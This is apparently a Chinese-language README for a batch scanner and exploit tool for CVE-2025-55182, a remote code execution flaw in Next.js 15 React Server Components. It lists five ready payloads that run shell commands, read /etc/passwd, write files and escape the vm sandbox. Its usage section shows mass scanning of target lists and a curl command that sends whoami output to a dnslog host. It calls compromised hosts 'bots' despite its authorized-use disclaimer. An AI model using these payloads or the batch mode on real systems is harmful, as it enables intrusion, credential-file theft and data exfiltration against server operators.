# cve_2025_55182_test
对cve_2025_55182漏洞的检测+利用脚本
# CVE-2025-55182 Next.js 15 React Server Components 原型污染 RCE  
## 终极批量验证工具使用说明 & 免责声明

### 一、漏洞概述
- **CVE 编号**：CVE-2025-55182  
- **影响版本**：Next.js 15.0.0 ~ 15.0.4（含 canary 版）  
- **漏洞类型**：React Server Components（RSC）中 `$ACTION_0:0` 参数处理不当导致的原型链污染 → 任意代码执行（RCE）  
- **修复版本**：Next.js ≥ 15.0.5（已升级 react-server-dom-webpack/turbopack ≥ 19.2.0）

### 二、参考资料（强烈建议阅读）
1. 漏洞详细分析文章（中文最全）：  
   https://blog.csdn.net/qq_62275604/article/details/155561777

2. 官方 PoC 与本地复现环境（可一键搭建测试靶机）：  
   https://github.com/ejpir/CVE-2025-55182-poc/

### 三、已验证有效 Payload 合集（本工具内置全部）

```json
{"id":"child_process#execSync","bound":["whoami"]}
{"id":"fs#readFileSync","bound":["/etc/passwd"]}
{"id":"fs#writeFileSync","bound":["/tmp/pwned.txt","CVE-2025-55182"]}
{"id":"vm#runInThisContext","bound":["process.mainModule.require(\"child_process\").execSync(\"id\").toString()"]}
{"id":"vm#runInNewContext","bound":["this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"whoami\").toString()"]}
```

### 四、工具功能亮点
- 支持单目标 `-u` 和批量 `-f` 两种模式
- 内置上述全部 5 条最强 Payload，自动轮询哪个能打通用哪个
- 实时显示响应时间（精确到毫秒）
- 智能超时机制（默认 10 秒超时自动跳过，绝不卡死）
- 成功目标自动保存（含响应时间 + 使用的 Payload + 执行结果）

### 五、使用方法

```bash
# 1. 单目标快速测试
python cve-2025-55182_fast.py -u http://target.com
python cve-2025-55182_fast.py -u 1.2.3.4:3000 -c "id"

# 2. 批量验证（推荐）
python cve-2025-55182_fast.py -f urls.txt
python cve-2025-55182_fast.py -f urls.txt -c "cat /etc/passwd"

# 3. 常用命令示例
-c "id"
-c "whoami"
-c "cat /flag"
-c "cat /etc/passwd"
-c "curl http://你的dnslog.cn/$(whoami)"
```

### 六、输出文件说明
扫描完成后结果保存在 `CVE-2025-55182_RCE_Results/` 目录：

- `RCE_SUCCESS.txt` → 重点关注！每一行都是真实可 RCE 的肉鸡
- `rce_results.jsonl` → 完整扫描记录（含失败目标）

### 七、【重要免责声明】

本工具仅用于以下合法场景：
1. 对您拥有明确授权的系统进行安全测试
2. 在授权的红队/渗透测试项目中使用
3. 学术研究与安全学习

严禁用于：
- 任何未经授权的扫描、入侵、破坏行为
- 对不属于自己的服务器、网站、系统进行测试
- 任何违法犯罪活动

作者及工具发布者不对因滥用本工具导致的任何法律责任、技术损害、数据丢失承担任何责任。一切后果由使用者自行承担。

安全研究，贵在责任。  
请在法律与道德的框架内使用技术，共同维护网络空间安全。

祝各位 2025 行稳致远，收大肉也要守底线！  
—— 2025.12.04 整理
